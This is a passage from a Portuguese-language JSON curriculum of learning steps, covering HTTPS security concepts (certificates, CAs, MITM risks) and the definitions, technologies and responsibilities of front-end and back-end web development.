                                  "tips": "Use analogias como 'cadeado na porta' para visualizar a segurança.",
                                  "learningObjective": "Entender o mecanismo básico de estabelecimento de conexão segura no HTTPS.",
                                  "commonMistakes": [
                                    "Confundir HTTP com HTTPS como apenas 'porta diferente'",
                                    "Ignorar o papel do handshake na autenticação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Benefícios Principais contra Ameaças",
                                  "subSteps": [
                                    "Defina eavesdropping (escuta passiva) e explique como HTTPS previne com criptografia de dados em trânsito.",
                                    "Descreva Man-in-the-Middle (MITM) e como o handshake TLS detecta intrusos via verificação de certificado.",
                                    "Liste benefícios adicionais: integridade de dados (detecção de alterações) e autenticação do servidor.",
                                    "Compare tráfego HTTP (visível em plain text) vs HTTPS (codificado) usando ferramentas de inspeção de rede.",
                                    "Discuta cenários reais: Wi-Fi público onde eavesdropping é comum."
                                  ],
                                  "verification": "Crie uma tabela comparativa de benefícios HTTPS vs riscos HTTP com exemplos de ataques.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Artigo OWASP sobre MITM",
                                    "Browser DevTools para inspecionar tráfego",
                                    "Exemplos de ataques em vídeos do YouTube"
                                  ],
                                  "tips": "Teste em sites reais: digite senhas em HTTP simulado para ver exposição.",
                                  "learningObjective": "Reconhecer como HTTPS mitiga eavesdropping e MITM especificamente.",
                                  "commonMistakes": [
                                    "Achar que HTTPS protege contra todos os ataques",
                                    "Não diferenciar eavesdropping passivo de MITM ativo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar a Importância de Certificados Válidos e CAs",
                                  "subSteps": [
                                    "Explique o que é um Certificate Authority (CA) e seu papel na emissão de certificados confiáveis.",
                                    "Descreva a cadeia de confiança: root CA > intermediate CA > certificado do site.",
                                    "Verifique certificados em browsers: clique no cadeado e inspecione detalhes (válido, emitido por).",
                                    "Discuta por que certificados válidos são cruciais: garantem que você está falando com o servidor real.",
                                    "Use ferramentas como SSL Labs para qualificar sites reais."
                                  ],
                                  "verification": "Analise o certificado de 3 sites populares e relate validade e CA.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Site SSL Labs (ssllabs.com/ssltest)",
                                    "Extensão browser 'HTTPS Everywhere'",
                                    "Lista de CAs confiáveis da Mozilla"
                                  ],
                                  "tips": "Procure por 'Not Secure' em browsers para ver alertas de certificados inválidos.",
                                  "learningObjective": "Compreender o ecossistema de confiança via CAs no HTTPS.",
                                  "commonMistakes": [
                                    "Confiar em qualquer cadeado sem verificar detalhes",
                                    "Ignorar expiração de certificados"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar Riscos e Limitações do HTTPS",
                                  "subSteps": [
                                    "Identifique riscos de certificados autoassinados: sem CA, fáceis de falsificar em MITM.",
                                    "Discuta outros problemas: certificados expirados, revogados ou com chaves fracas.",
                                    "Aborde ataques como downgrade (forçar HTTP) ou HSTS bypass.",
                                    "Liste mitigações: HSTS, Certificate Transparency, pinning de certificados.",
                                    "Debata cenários onde HTTPS falha: endpoint comprometido ou phishing com HTTPS falso."
                                  ],
                                  "verification": "Escreva um relatório curto listando 5 riscos e como mitigá-los.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Documentação sobre HSTS",
                                    "Exemplos de certificados autoassinados via OpenSSL",
                                    "Relatórios de vulnerabilidades CVE"
                                  ],
                                  "tips": "Gere um certificado autoassinado local para testar alertas de browser.",
                                  "learningObjective": "Identificar e contextualizar riscos residuais no HTTPS.",
                                  "commonMistakes": [
                                    "Acreditar que HTTPS é 100% seguro",
                                    "Subestimar riscos de configuração errada"
                                  ]
                                }
                              ],
                              "practicalExample": "Acesse um site de banco via Wi-Fi público: use DevTools para capturar tráfego HTTP (expondo credenciais) vs HTTPS (dados criptografados). Simule MITM com ferramenta como Fiddler e observe falha no handshake com certificado inválido.",
                              "finalVerifications": [
                                "Explique corretamente 3 benefícios do HTTPS contra eavesdropping e MITM.",
                                "Descreva o papel de CAs e por que certificados autoassinados são perigosos.",
                                "Liste pelo menos 3 riscos do HTTPS e mitigações associadas.",
                                "Analise um certificado real e identifique elementos de confiança.",
                                "Compare HTTPS vs HTTP em um cenário de e-commerce real.",
                                "Demonstre compreensão de handshake TLS em um fluxograma."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: Conceitos corretos sem mitos comuns (ex: HTTPS não protege endpoints).",
                                "Completude: Cobertura de benefícios, certificados e riscos sem omissões chave.",
                                "Profundidade: Uso de exemplos concretos e ferramentas para verificação.",
                                "Clareza: Explicações concisas e estruturadas, acessíveis a iniciantes.",
                                "Aplicação prática: Capacidade de analisar cenários reais ou simulações.",
                                "Crítica: Reconhecimento de limitações, não visão binária 'seguro/inseguro'."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia (Matemática/Computação): Assinaturas digitais e chaves assimétricas.",
                                "Redes de Computadores: Protocolos de camada de transporte e análise de pacotes.",
                                "Ética e Privacidade: Impacto na proteção de dados pessoais e regulamentações como LGPD/GDPR.",
                                "Desenvolvimento Web: Implementação de HSTS em aplicações.",
                                "Segurança Cibernética: Ameaças avançadas como CA compromise."
                              ],
                              "realWorldApplication": "Em e-commerce e banking online, HTTPS previne roubo de dados em transações; profissionais de TI usam para configurar servidores seguros, evitando multas por não conformidade com PCI-DSS ou GDPR."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.4",
                    "name": "Front-end e Back-end",
                    "description": "Componentes da aplicação: interface do usuário (front-end) e lógica do servidor (back-end).",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.4.1",
                        "name": "Front-end",
                        "description": "O front-end refere-se à camada de apresentação de uma aplicação web, responsável pela interface do usuário (UI) e pela experiência do usuário (UX), executada diretamente no navegador do cliente utilizando tecnologias como HTML, CSS e JavaScript.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.4.1.1",
                            "name": "Definir o conceito de Front-end",
                            "description": "Explicar o que é o front-end em aplicações para a Internet, destacando seu papel na renderização visual e interação inicial com o usuário, sem envolver processamento de dados sensíveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o contexto das aplicações web",
                                  "subSteps": [
                                    "Pesquise o que é uma aplicação web e exemplos cotidianos como sites de e-commerce ou redes sociais.",
                                    "Identifique os elementos visuais que você interage ao acessar um site (botões, menus, imagens).",
                                    "Anote como o usuário percebe apenas a parte visual inicial sem saber o que acontece nos bastidores.",
                                    "Compare com aplicativos desktop para destacar a especificidade da web.",
                                    "Registre 3 exemplos de sites e descreva sua primeira impressão visual."
                                  ],
                                  "verification": "Lista com 3 exemplos de sites e descrições visuais anotadas corretamente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Bloco de notas ou editor de texto",
                                    "Navegador web"
                                  ],
                                  "tips": "Foque apenas na experiência visual inicial, ignorando cadastros ou logins por enquanto.",
                                  "learningObjective": "Compreender o ambiente das aplicações web e o papel da interface visual.",
                                  "commonMistakes": [
                                    "Confundir com processamento de dados",
                                    "Ignorar exemplos reais do dia a dia"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir os componentes básicos do Front-end",
                                  "subSteps": [
                                    "Estude os termos HTML, CSS e JavaScript como pilares do Front-end.",
                                    "Descreva o papel de cada: HTML para estrutura, CSS para estilo, JS para interatividade.",
                                    "Crie um diagrama simples mostrando como eles se combinam para renderizar uma página.",
                                    "Acesse um site e identifique elementos HTML/CSS/JS usando as ferramentas de desenvolvedor do navegador.",
                                    "Explique em uma frase curta como eles criam a renderização visual."
                                  ],
                                  "verification": "Diagrama criado e frase explicativa sobre HTML/CSS/JS.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Navegador com DevTools (F12)",
                                    "Papel e caneta ou ferramenta de desenho online",
                                    "Documentação básica de HTML/CSS/JS"
                                  ],
                                  "tips": "Use o inspetor de elementos do Chrome/Firefox para ver o código real de um site.",
                                  "learningObjective": "Identificar e descrever os componentes essenciais do Front-end.",
                                  "commonMistakes": [
                                    "Achar que Front-end inclui banco de dados",
                                    "Confundir JS com lógica de servidor"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar o papel do Front-end na interação do usuário",
                                  "subSteps": [
                                    "Descreva como o Front-end lida com a renderização visual e eventos iniciais (cliques, scrolls).",
                                    "Destaque que ele não processa dados sensíveis, apenas envia para o Back-end.",
                                    "Simule uma interação: abra um site, clique em um botão e observe o que muda visualmente.",
                                    "Anote 4 responsabilidades específicas: responsividade, acessibilidade, usabilidade e performance visual.",
                                    "Formule uma definição parcial: 'Front-end é a camada...'"
                                  ],
                                  "verification": "Lista de 4 responsabilidades e definição parcial escrita.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Site de exemplo como Google ou Wikipedia",
                                    "Bloco de notas"
                                  ],
                                  "tips": "Pense no Front-end como a 'vitrine' da loja, atrativa mas sem estoque.",
                                  "learningObjective": "Articular o foco do Front-end em visual e interação inicial.",
                                  "commonMistakes": [
                                    "Incluir autenticação ou storage de dados na definição",
                                    "Subestimar a importância da usabilidade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Consolidar a definição completa de Front-end",
                                  "subSteps": [
                                    "Integre os aprendizados anteriores em uma definição completa.",
                                    "Compare com Back-end: Front-end = cliente, Back-end = servidor.",
                                    "Escreva a definição final destacando renderização visual e interação sem dados sensíveis.",
                                    "Crie um fluxograma simples: Usuário → Front-end → Back-end.",
                                    "Revise e refine a definição com base em fontes confiáveis."
                                  ],
                                  "verification": "Definição final escrita e fluxograma criado.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Fontes online como MDN Web Docs",
                                    "Ferramenta de fluxograma como Draw.io gratuito"
                                  ],
                                  "tips": "Mantenha a definição concisa: 2-3 frases claras.",
                                  "learningObjective": "Formular uma definição precisa e completa do conceito de Front-end.",
                                  "commonMistakes": [
                                    "Definição vaga ou muito técnica",
                                    "Misturar responsabilidades do Back-end"
                                  ]
                                }
                              ],
                              "practicalExample": "Ao acessar o site do YouTube, o Front-end renderiza o player de vídeo, botões de play/pause e lista de sugestões visualmente, capturando cliques iniciais do usuário, mas envia dados de reprodução para o Back-end sem processá-los localmente.",
                              "finalVerifications": [
                                "Pode definir Front-end em suas próprias palavras com precisão.",
                                "Identifica corretamente HTML/CSS/JS como componentes principais.",
                                "Diferencia Front-end de Back-end em responsabilidades.",
                                "Explica o foco em renderização visual e interação inicial.",
                                "Cita exemplos reais sem confundir com processamento de dados.",
                                "Descreve limitações: sem dados sensíveis."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (80% das responsabilidades corretas).",
                                "Clareza na distinção Front-end vs Back-end.",
                                "Uso de exemplos práticos e relevantes.",
                                "Compreensão de componentes (HTML/CSS/JS).",
                                "Ausência de confusões com processamento server-side.",
                                "Capacidade de formular definição concisa e acionável."
                              ],
                              "crossCurricularConnections": [
                                "Design Gráfico: Aplicação de princípios visuais em CSS.",
                                "UX/UI: Foco em usabilidade e experiência do usuário.",
                                "Comunicação: Tradução de requisitos em interfaces intuitivas.",
                                "Matemática/Algoritmos: Lógica básica em JavaScript para interações."
                              ],
                              "realWorldApplication": "No desenvolvimento de sites como e-commerces (ex: Amazon), o Front-end garante que o usuário veja produtos de forma atrativa e navegue intuitivamente, melhorando conversões sem expor dados de pagamento, que são gerenciados pelo Back-end."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.1.2",
                            "name": "Identificar tecnologias principais do Front-end",
                            "description": "Listar e descrever as tecnologias fundamentais do front-end, como HTML para estrutura, CSS para estilização e JavaScript para interatividade dinâmica no lado do cliente.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o papel do HTML na estrutura do Front-end",
                                  "subSteps": [
                                    "Pesquise a definição oficial de HTML (HyperText Markup Language).",
                                    "Identifique os elementos básicos: tags como <html>, <head>, <body>, <h1>, <p>, <div>.",
                                    "Crie um documento HTML simples com DOCTYPE, estrutura básica e conteúdo semântico.",
                                    "Valide o código usando o validador W3C.",
                                    "Explique como HTML forma o esqueleto de uma página web."
                                  ],
                                  "verification": "Documento HTML válido renderizado corretamente no navegador sem erros de console.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Editor de texto (VS Code), navegador web (Chrome), validador W3C (https://validator.w3.org/)",
                                  "tips": "Sempre use tags semânticas como <header> e <footer> para melhor acessibilidade.",
                                  "learningObjective": "Compreender HTML como linguagem de marcação para estrutura semântica.",
                                  "commonMistakes": "Confundir HTML com estilização (isso é CSS) ou confundir tags de fechamento."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar CSS para estilização e layout",
                                  "subSteps": [
                                    "Estude seletores CSS básicos: por tag, classe, ID e hierarquia.",
                                    "Aprenda propriedades fundamentais: color, font-size, margin, padding, display (flex/grid).",
                                    "Aplique CSS a um HTML existente para alterar cores, fontes e layout responsivo.",
                                    "Use ferramentas como DevTools do navegador para inspecionar e editar estilos ao vivo.",
                                    "Descreva como CSS separa apresentação da estrutura."
                                  ],
                                  "verification": "Página HTML estilizada responsivamente em diferentes tamanhos de tela.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "VS Code, navegador com DevTools, CSS-Tricks (https://css-tricks.com/)",
                                  "tips": "Comece com mobile-first para designs responsivos usando media queries.",
                                  "learningObjective": "Dominar CSS como ferramenta para visual e layout no front-end.",
                                  "commonMistakes": "Especificidade excessiva levando a !important desnecessário; ignorar reset/normalize CSS."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Dominar JavaScript para interatividade dinâmica",
                                  "subSteps": [
                                    "Revise conceitos básicos: variáveis, funções, DOM manipulation (getElementById, querySelector).",
                                    "Implemente eventos: click, submit, com addEventListener.",
                                    "Crie interatividade simples: botão que altera texto, formulário validado no cliente.",
                                    "Explique o papel do JS no lado do cliente vs. servidor.",
                                    "Teste scripts no console do navegador."
                                  ],
                                  "verification": "Elementos interativos funcionando sem erros no console (ex: contador de cliques).",
                                  "estimatedTime": "75 minutos",
                                  "materials": "VS Code, MDN JavaScript Guide (https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide), console do navegador",
                                  "tips": "Use strict mode ('use strict') para evitar erros comuns.",
                                  "learningObjective": "Identificar JS como motor de lógica e interatividade no front-end.",
                                  "commonMistakes": "Manipular DOM sem verificar existência de elementos; vazamentos de memória em loops."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar HTML, CSS e JS e identificar ecossistema front-end",
                                  "subSteps": [
                                    "Combine as três tecnologias em um projeto único: página com estrutura, estilo e interatividade.",
                                    "Pesquise tecnologias complementares: frameworks (React), pré-processadores (Sass), ferramentas (Webpack).",
                                    "Liste e descreva pelo menos 3 tecnologias principais e 2 auxiliares.",
                                    "Crie um diagrama simples mostrando fluxo: HTML -> CSS -> JS.",
                                    "Discuta limitações do front-end puro (ex: necessidade de back-end para dados)."
                                  ],
                                  "verification": "Projeto integrado funcional com lista escrita das tecnologias principais.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "VS Code, Canva/Draw.io para diagrama, documentação MDN",
                                  "tips": "Hospede o projeto no GitHub Pages para portfólio.",
                                  "learningObjective": "Reconhecer integração e ecossistema completo do front-end.",
                                  "commonMistakes": "Subestimar dependências entre linguagens; ignorar performance (ex: JS bloqueando render)."
                                }
                              ],
                              "practicalExample": "Crie uma página de 'Calculadora de IMC' usando HTML para formulário, CSS para design responsivo e JavaScript para calcular e exibir resultado dinamicamente ao submeter.",
                              "finalVerifications": [
                                "Lista correta das 3 tecnologias principais (HTML, CSS, JS) com descrições precisas.",
                                "Código de exemplo integrado renderiza e funciona no navegador.",
                                "Diagrama ou explicação clara da integração entre as tecnologias.",
                                "Identificação de pelo menos 2 tecnologias complementares (ex: React, Bootstrap).",
                                "Validação sem erros de HTML/CSS e console limpo para JS.",
                                "Descrição verbal ou escrita das funções de cada tecnologia."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e descrição das funções de HTML, CSS e JS (70%).",
                                "Qualidade do exemplo prático integrado e funcional (20%).",
                                "Profundidade de conexões com ecossistema front-end (10%).",
                                "Clareza na verificação de conhecimentos via lista/diagrama.",
                                "Ausência de erros conceituais comuns (ex: confundir front com back-end)."
                              ],
                              "crossCurricularConnections": [
                                "Design Gráfico: Aplicação de princípios de UI/UX com CSS.",
                                "Programação Geral: Lógica de JS conecta com back-end (Node.js).",
                                "Banco de Dados: Integração front-end com APIs REST para dados.",
                                "Matemática/Algoritmos: Cálculos dinâmicos em JS (ex: validações)."
                              ],
                              "realWorldApplication": "Desenvolvimento de sites e SPAs como e-commerces (ex: Amazon front-end), dashboards interativos em empresas de tech, ou landing pages responsivas para marketing digital."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.1.3",
                            "name": "Descrever responsabilidades do Front-end",
                            "description": "Detalhar as funções do front-end, incluindo criação de layouts responsivos, manipulação de eventos do usuário e comunicação assíncrona com o back-end via APIs (ex.: fetch ou AJAX).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Conceituar o Front-end e suas responsabilidades gerais",
                                  "subSteps": [
                                    "Defina o que é Front-end como a camada de interface do usuário em aplicações web.",
                                    "Liste responsabilidades principais: renderização de conteúdo, interatividade e apresentação visual.",
                                    "Diferencie Front-end de Back-end: Front-end lida com o 'o quê o usuário vê e interage'.",
                                    "Identifique tecnologias chave: HTML para estrutura, CSS para estilo e JavaScript para comportamento.",
                                    "Pesquise exemplos reais de responsabilidades em sites populares."
                                  ],
                                  "verification": "Crie um diagrama simples ou lista com pelo menos 5 responsabilidades principais do Front-end.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Documentação MDN Web Docs sobre HTML/CSS/JS, papel e caneta para diagrama.",
                                  "tips": "Use analogias como 'Front-end é a vitrine da loja, atraindo o cliente'.",
                                  "learningObjective": "Compreender o escopo geral das responsabilidades do Front-end.",
                                  "commonMistakes": "Confundir Front-end com Back-end, achando que Front-end gerencia dados no servidor."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar criação de layouts responsivos",
                                  "subSteps": [
                                    "Estude conceitos de responsividade: adaptação a diferentes tamanhos de tela (mobile-first).",
                                    "Aprenda media queries em CSS para breakpoints comuns (ex.: 768px para tablets).",
                                    "Pratique com Flexbox ou Grid para layouts flexíveis.",
                                    "Teste em ferramentas como Chrome DevTools para simular dispositivos.",
                                    "Analise como layouts responsivos impactam a experiência do usuário."
                                  ],
                                  "verification": "Desenvolva um layout simples que se adapte a 3 tamanhos de tela e capture screenshots.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Editor de código (VS Code), navegador com DevTools, exemplos de CSS Grid/Flexbox no MDN.",
                                  "tips": "Sempre comece com mobile-first para priorizar usuários móveis.",
                                  "learningObjective": "Dominar técnicas para criar interfaces que funcionem em qualquer dispositivo.",
                                  "commonMistakes": "Usar larguras fixas em pixels em vez de relativas (%, vw, vh)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Dominar manipulação de eventos do usuário",
                                  "subSteps": [
                                    "Identifique tipos de eventos: click, hover, keydown, submit.",
                                    "Aprenda a adicionar event listeners em JavaScript (addEventListener).",
                                    "Implemente handlers para validar inputs e atualizar DOM dinamicamente.",
                                    "Estude propagação de eventos (bubbling e capturing).",
                                    "Crie um exemplo interativo como um menu dropdown ou formulário validado."
                                  ],
                                  "verification": "Construa uma página com 3 eventos diferentes e demonstre seu funcionamento.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "JavaScript vanilla, console do navegador para debug.",
                                  "tips": "Use event.preventDefault() para evitar comportamentos padrão indesejados.",
                                  "learningObjective": "Habilitar interações dinâmicas e responsivas com o usuário.",
                                  "commonMistakes": "Anexar múltiplos listeners ao mesmo elemento sem remover, causando memory leaks."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Entender comunicação assíncrona com Back-end via APIs",
                                  "subSteps": [
                                    "Conceitue APIs REST e comunicação cliente-servidor.",
                                    "Aprenda fetch API ou XMLHttpRequest (AJAX) para requisições assíncronas.",
                                    "Pratique GET/POST com JSON: envie dados e atualize a UI sem reload.",
                                    "Gerencie erros com try-catch e promises/async-await.",
                                    "Integre em um exemplo: carregar lista de produtos de uma API mock."
                                  ],
                                  "verification": "Faça uma requisição fetch que atualize o DOM com dados de uma API pública (ex.: JSONPlaceholder).",
                                  "estimatedTime": "50 minutos",
                                  "materials": "API pública como JSONPlaceholder, Postman para testar endpoints.",
                                  "tips": "Sempre valide respostas e trate erros de rede para robustez.",
                                  "learningObjective": "Conectar Front-end ao Back-end de forma eficiente e não-bloqueante.",
                                  "commonMistakes": "Esquecer CORS ou não usar async/await, causando bloqueios na UI."
                                }
                              ],
                              "practicalExample": "Em um e-commerce como o Magazine Luiza, o Front-end cria layouts responsivos para exibir produtos em mobile/desktop, manipula cliques para adicionar ao carrinho (eventos) e usa fetch para buscar estoque do back-end sem recarregar a página.",
                              "finalVerifications": [
                                "Lista completa de pelo menos 8 responsabilidades do Front-end com exemplos.",
                                "Demonstração de layout responsivo funcionando em 3 dispositivos simulados.",
                                "Código funcional com 3 eventos manipulados e log de console.",
                                "Requisição assíncrona bem-sucedida atualizando DOM com dados reais.",
                                "Diagrama ou mapa mental conectando Front-end a Back-end.",
                                "Explicação oral ou escrita clara das 3 áreas principais (layouts, eventos, APIs)."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: responsabilidades descritas corretamente sem confusões.",
                                "Profundidade: inclusão de exemplos técnicos como fetch, media queries e addEventListener.",
                                "Completude: cobertura de layouts responsivos, eventos e comunicação assíncrona.",
                                "Praticidade: códigos e demos funcionais sem erros graves.",
                                "Clareza: descrições concisas e bem estruturadas.",
                                "Criatividade: uso de analogias ou exemplos reais relevantes."
                              ],
                              "crossCurricularConnections": [
                                "Design Gráfico: criação de layouts visualmente atraentes e UX/UI.",
                                "Programação: lógica em JavaScript para eventos e assincronia.",
                                "Redes de Computadores: compreensão de HTTP, APIs e protocolos cliente-servidor.",
                                "Banco de Dados: integração indireta via APIs para manipular dados.",
                                "Gestão de Projetos: responsabilidades em equipes ágeis de desenvolvimento."
                              ],
                              "realWorldApplication": "Desenvolvedores Front-end em empresas como Google ou Netflix usam essas responsabilidades para criar sites rápidos e intuitivos, garantindo que milhões de usuários acessem conteúdos responsivos, interativos e conectados a serviços backend em tempo real."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.4.2",
                        "name": "Back-end",
                        "description": "O back-end é a camada lógica do servidor em aplicações web, responsável pelo processamento de dados, autenticação de usuários, gerenciamento de banco de dados e execução de regras de negócio, inacessível diretamente ao usuário.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.4.2.1",
                            "name": "Definir o conceito de Back-end",
                            "description": "Explicar o que é o back-end em aplicações para a Internet, enfatizando seu foco em segurança, escalabilidade e manipulação de dados no servidor.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a arquitetura cliente-servidor em aplicações web",
                                  "subSteps": [
                                    "Pesquisar definições de 'client-side' e 'server-side' em fontes confiáveis como MDN Web Docs ou tutoriais de desenvolvimento web.",
                                    "Visualizar diagramas de arquitetura de aplicações web, identificando o navegador como cliente e o servidor como provedor de dados.",
                                    "Explicar o fluxo de comunicação via protocolos HTTP/HTTPS entre cliente e servidor.",
                                    "Identificar exemplos cotidianos, como acessar um site de e-commerce."
                                  ],
                                  "verification": "Desenhar e rotular um diagrama simples da arquitetura cliente-servidor.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Ferramenta de desenho como Draw.io ou papel e caneta"
                                  ],
                                  "tips": [
                                    "Use a analogia de um restaurante: front-end é o garçom (interface), back-end é a cozinha (processamento)."
                                  ],
                                  "learningObjective": "Entender a divisão fundamental entre cliente e servidor em apps web.",
                                  "commonMistakes": [
                                    "Confundir o servidor com o navegador",
                                    "Ignorar o papel da rede na comunicação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir o conceito preciso de Back-end",
                                  "subSteps": [
                                    "Ler definições oficiais de back-end em documentações como as do Node.js ou Django.",
                                    "Anotar os componentes principais: servidor, lógica de negócio e banco de dados.",
                                    "Enfatizar o foco em processamento no servidor, isolado do usuário final.",
                                    "Escrever uma definição inicial em palavras próprias, incluindo os termos 'segurança', 'escalabilidade' e 'manipulação de dados'."
                                  ],
                                  "verification": "Redigir uma definição de back-end em 3 frases concisas.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Documentações online (MDN, freeCodeCamp)",
                                    "Bloco de notas ou editor de texto"
                                  ],
                                  "tips": [
                                    "Lembre-se: back-end é 'invisível' para o usuário, mas essencial para o funcionamento.",
                                    "Compare com 'bastidores' de um teatro."
                                  ],
                                  "learningObjective": "Formular uma definição clara e precisa do back-end.",
                                  "commonMistakes": [
                                    "Limitar back-end apenas a bancos de dados",
                                    "Confundir com hospedagem estática"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar responsabilidades chave do Back-end",
                                  "subSteps": [
                                    "Estudar segurança: autenticação (JWT, OAuth), autorização e criptografia de dados.",
                                    "Analisar escalabilidade: técnicas como load balancing, caching e microsserviços.",
                                    "Detalhar manipulação de dados: operações CRUD, APIs REST/GraphQL e integração com bancos.",
                                    "Listar exemplos de tecnologias: Node.js, Python (Flask/Django), bancos como MySQL/PostgreSQL.",
                                    "Simular um fluxo: como o back-end processa um login de usuário."
                                  ],
                                  "verification": "Criar uma tabela com 3 responsabilidades e exemplos de implementação.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Tutoriais de back-end (YouTube ou freeCodeCamp)",
                                    "Planilha ou tabela em Google Sheets"
                                  ],
                                  "tips": [
                                    "Priorize segurança como prioridade máxima no back-end.",
                                    "Pense em cenários de alto tráfego para entender escalabilidade."
                                  ],
                                  "learningObjective": "Identificar e explicar as responsabilidades principais do back-end.",
                                  "commonMistakes": [
                                    "Subestimar segurança como 'apenas senhas'",
                                    "Ignorar escalabilidade em apps pequenos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Diferenciar Back-end de Front-end e sintetizar o conceito",
                                  "subSteps": [
                                    "Comparar front-end (HTML/CSS/JS, UI/UX) vs back-end (lógica servidor, dados).",
                                    "Analisar integrações via APIs e como o back-end suporta o front-end.",
                                    "Revisar exemplos reais de apps full-stack.",
                                    "Refinar a definição pessoal incorporando diferenças e responsabilidades."
                                  ],
                                  "verification": "Explicar oralmente ou por escrito a diferença entre front e back-end com um exemplo.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Diagramas comparativos online",
                                    "Gravador de voz ou vídeo para autoexplicação"
                                  ],
                                  "tips": [
                                    "Use tabelas de comparação para clareza visual.",
                                    "Teste sua explicação como se ensinasse a um iniciante."
                                  ],
                                  "learningObjective": "Diferenciar back-end de front-end e consolidar o conceito completo.",
                                  "commonMistakes": [
                                    "Achar que front-end faz processamento pesado",
                                    "Não mencionar APIs na integração"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um aplicativo de e-commerce como o Mercado Livre, o back-end gerencia autenticação segura de usuários (login com criptografia), processa pedidos manipulando dados em bancos (estoque e pagamentos), e escala servidores para suportar Black Friday com milhões de acessos simultâneos, sem expor lógica sensível ao front-end no navegador.",
                              "finalVerifications": [
                                "Explicar o conceito de back-end em palavras próprias, citando segurança, escalabilidade e dados.",
                                "Identificar pelo menos 3 responsabilidades exclusivas do back-end em um app web.",
                                "Diferenciar corretamente back-end de front-end com um diagrama ou tabela.",
                                "Dar um exemplo real de aplicação back-end em um serviço online.",
                                "Listar tecnologias comuns usadas no back-end."
                              ],
                              "assessmentCriteria": [
                                "Definição inclui foco em servidor, segurança, escalabilidade e manipulação de dados (peso: 30%).",
                                "Explicação diferencia claramente de front-end e arquitetura cliente-servidor (peso: 25%).",
                                "Inclui exemplos práticos e responsabilidades específicas (peso: 20%).",
                                "Demonstra compreensão via verificações e síntese coerente (peso: 15%).",
                                "Uso correto de terminologia técnica sem erros conceituais (peso: 10%)."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Protocolos de autenticação e criptografia de dados.",
                                "Banco de Dados: Modelagem, consultas SQL/NoSQL e operações CRUD.",
                                "Administração e Negócios: Estratégias de escalabilidade e gerenciamento de recursos em sistemas empresariais.",
                                "Matemática Computacional: Algoritmos de otimização para performance e balanceamento de carga.",
                                "Redes de Computadores: Protocolos HTTP/HTTPS e arquitetura distribuída."
                              ],
                              "realWorldApplication": "No setor bancário, como no app do Nubank, o back-end garante transações financeiras seguras (com criptografia e autenticação biométrica), manipula grandes volumes de dados de contas e transações em bancos escaláveis, e suporta picos de uso durante promoções ou fins de mês, prevenindo fraudes e mantendo alta disponibilidade 24/7."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.4.2.2",
                            "name": "Identificar tecnologias principais do Back-end",
                            "description": "Listar e descrever linguagens e frameworks comuns do back-end, como Node.js, PHP, Python (Django/Flask), Java (Spring) e bancos de dados como MySQL ou MongoDB.",
